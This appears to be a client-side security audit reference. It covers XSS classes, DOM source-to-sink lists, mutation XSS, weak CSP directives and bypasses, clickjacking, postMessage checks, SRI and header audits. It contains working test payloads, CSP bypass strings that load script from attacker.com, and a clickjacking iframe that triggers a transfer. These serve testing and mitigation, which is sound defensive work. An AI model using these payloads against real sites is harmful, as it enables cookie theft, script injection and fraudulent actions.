# Client-Side Security Reference

Load this file during Phase 10.

---

## XSS — Full Classification

### Reflected XSS
- User input echoed in HTTP response without context-aware encoding
- Test: inject `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`, `javascript:alert(1)`
- Check: search parameters, error messages, 404 pages, redirect targets reflected in response

### Stored XSS
- User input persisted to DB/storage and rendered to other users
- Higher severity: one-time inject affects all users viewing the resource
- Targets: comments, profile fields, product descriptions, file/folder names, log viewers

### DOM-Based XSS — Source → Sink Matrix

**Sources (client-side untrusted input):**
- `location.hash` — never sent to server; fully client-controlled
- `location.search` — query params
- `location.href` — full URL
- `document.referrer`
- `window.name` — persists across navigations
- `postMessage` event `data`
- `localStorage` / `sessionStorage` / `IndexedDB`
- `document.cookie` (if not HttpOnly)

**Sinks (dangerous DOM APIs):**
```javascript
// Direct HTML injection
element.innerHTML = source
element.outerHTML = source
document.write(source)
document.writeln(source)
element.insertAdjacentHTML('beforeend', source)

// Script execution
eval(source)
setTimeout(source, 0)          // string form only
setInterval(source, 0)         // string form only
new Function(source)()

// URL-based
element.src = source           // javascript: URI
element.href = source          // javascript: URI
location.href = source         // javascript: URI redirect
location.assign(source)
location.replace(source)

// Framework-specific
// React
dangerouslySetInnerHTML={{ __html: source }}

// Angular
bypassSecurityTrustHtml(source)
bypassSecurityTrustScript(source)
bypassSecurityTrustUrl(source)

// Vue
v-html="source"
```

**DOM XSS example trace:**
```javascript
// Source: location.hash
const theme = location.hash.slice(1)  // "#darkmode" → "darkmode"
// Sink: innerHTML
document.getElementById('app').innerHTML = `<div class="${theme}">`
// Payload: #"><img src=x onerror=alert(document.cookie)>
```

### Mutation XSS (mXSS)
HTML parsed differently by sanitizer vs browser DOM mutation:
```html
<!-- Input after sanitizer: looks safe -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<!-- Browser with scripts enabled: noscript content not parsed as HTML → different AST → XSS -->
```
Mitigation: use DOMPurify (with `FORCE_BODY`) and keep it updated; mXSS bypasses found regularly.

---

## Content Security Policy (CSP) Evaluation

### CSP Weakness Matrix

| Directive Issue | Attack Enabled |
|---|---|
| `script-src *` | Load script from any CDN including attacker-controlled |
| `script-src 'unsafe-inline'` | `<script>` tags and inline event handlers execute |
| `script-src 'unsafe-eval'` | `eval()`, `setTimeout(string)`, `Function()` execute |
| `script-src data:` | `<script src="data:text/javascript,alert(1)">` |
| `script-src 'nonce-x'` with leaked nonce | Nonce reused across requests → bypassed |
| `script-src` allowlisting JSONP endpoints | `<script src="allowed.com/jsonp?callback=alert">` |
| `script-src` allowlisting Angular CDN | AngularJS template injection as CSP bypass |
| Missing `object-src` | `<object data="...">` loads arbitrary plugin content |
| Missing `base-uri` | `<base href="https://attacker.com">` hijacks relative URLs |
| Missing `frame-ancestors` | Clickjacking possible |

### CSP Bypass Techniques
- **JSONP endpoint on allowlisted domain:** `<script src="trusted.com/api?callback=alert">`
- **AngularJS + CDN allowlisted:** `<div ng-app>{{constructor.constructor('alert(1)')()}}`
- **Open redirect on allowlisted domain:** `<script src="trusted.com/redirect?to=attacker.com/xss.js">`
- **Nonce reuse detection:** if nonce is static per session rather than per-response

---

## Clickjacking

**Conditions for exploitability:**
1. No `X-Frame-Options: DENY/SAMEORIGIN` AND no CSP `frame-ancestors` directive
2. Sensitive action performable with single click (approve, delete, transfer, confirm)
3. Action triggered by UI element positionable under attacker's UI

**Attack:**
```html
<!-- Attacker page: transparent iframe overlaid on button -->
<iframe src="https://victim.com/transfer?to=attacker&amount=1000"
        style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%">
</iframe>
<button style="position:absolute; top:200px; left:150px">Click to win!</button>
```

**Double-click hijacking:** modern variant — first click focuses iframe, second click triggers action.
Mitigation: `frame-ancestors 'none'` in CSP (preferred over X-Frame-Options).

---

## postMessage Security

### Missing Origin Validation
```javascript
// Vulnerable — accepts messages from ANY origin
window.addEventListener("message", function(event) {
  document.getElementById("output").innerHTML = event.data;
});

// Safe
window.addEventListener("message", function(event) {
  if (event.origin !== "https://trusted-parent.com") return;
  // process event.data safely
});
```

### Sending to Wildcard Origin
```javascript
// Vulnerable — any origin can receive the message
window.parent.postMessage(sensitiveData, "*");

// Safe — specify exact target origin
window.parent.postMessage(sensitiveData, "https://trusted-parent.com");
```

---

## Subresource Integrity (SRI)

External scripts and styles without `integrity` attribute:
```html
<!-- Vulnerable — CDN compromise → XSS for all users -->
<script src="https://cdn.example.com/jquery.min.js"></script>

<!-- Safe — browser verifies hash before executing -->
<script src="https://cdn.example.com/jquery.min.js"
        integrity="sha256-<base64-encoded-hash>"
        crossorigin="anonymous"></script>
```

Generate hash: `openssl dgst -sha256 -binary file.js | openssl base64 -A`
Required alongside: `crossorigin="anonymous"` (enforces CORS for the resource).

---

## HTTP Security Header Audit

| Header | Required Value | Gap if Missing |
|---|---|---|
| `Content-Security-Policy` | No `unsafe-inline`/`unsafe-eval`/`*` in script-src; `frame-ancestors 'none'`; `base-uri 'self'`; `object-src 'none'` | XSS, clickjacking, plugin injection |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | MITM, SSL stripping |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing → XSS via misclassified content |
| `X-Frame-Options` | `DENY` (superseded by CSP frame-ancestors) | Clickjacking |
| `Referrer-Policy` | `strict-origin-when-cross-origin` or stricter | Token/PII leakage in Referer to third parties |
| `Permissions-Policy` | Restrict: `camera=()`, `microphone=()`, `geolocation=()`, `payment=()` unless used | Feature abuse by injected content |
| `Cross-Origin-Embedder-Policy` | `require-corp` (if SharedArrayBuffer/high-res timers needed) | Spectre side-channel |
| `Cross-Origin-Opener-Policy` | `same-origin` | Cross-origin window interaction, Spectre |
| `Cross-Origin-Resource-Policy` | `same-origin` or `same-site` | Cross-origin read of responses |
| `Cache-Control` (auth endpoints) | `no-store, no-cache` | Cached sensitive responses in shared proxies/CDN |
| `Clear-Site-Data` (on logout) | `"cache", "cookies", "storage"` | Stale auth data after logout |

**Audit method:**
```bash
curl -I https://target.com | grep -iE "(content-security|strict-transport|x-content|x-frame|referrer|permissions|cross-origin|cache-control)"
```
